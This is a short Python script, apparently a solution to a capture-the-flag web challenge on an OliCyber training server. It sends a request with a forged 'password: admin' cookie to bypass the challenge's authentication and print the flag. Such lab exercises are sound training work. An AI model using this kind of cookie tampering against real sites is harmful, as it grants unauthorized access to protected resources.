import requests
cookies = {'password' : 'admin'}
print(requests.get('http://web-05.challs.olicyber.it/flag', cookies=cookies).text)
